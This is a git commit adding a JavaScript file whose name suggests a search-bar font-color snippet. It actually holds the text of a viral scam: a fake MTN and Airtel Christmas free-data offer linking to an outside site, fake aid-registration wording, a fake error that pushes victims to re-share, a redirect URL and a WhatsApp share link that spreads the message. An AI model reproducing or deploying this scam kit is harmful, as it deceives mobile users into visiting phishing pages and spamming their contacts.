ff52c94f5ed875a2a9f70fe42fb5d02f29afb93a
mfednewblog9 <newekpeitid@gmail.com>
2025-12-21 08:34:41 +0100

    Create java-script-css-search-bar-font-color.js

---
+++ java-script-css-search-bar-font-color.js
@@ -0,0 +1,10 @@
+
+          var text1 ="*MTN AND AIRTEL CHRISTMAS AND NEW YEAR OFFER*%0A%0AAre you an MTN or Airtel Customer? Hurry now and get your Christmas and New Year Offer%0A%0A*AIRTEL USERS* - 15GB%0A*MTN USERS* - 25GB %0A%0A*(For MTN) Click Here*👇%0Ahttps://fhreekift.org/xmas-offer %0A%0A*(For Airtel) Click Here*👇%0Ahttps://fhreekift.org/xmas-offer",
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly Ã°Å¸â€˜â€° ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "http://outrotomr.com/4/3144603",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+  
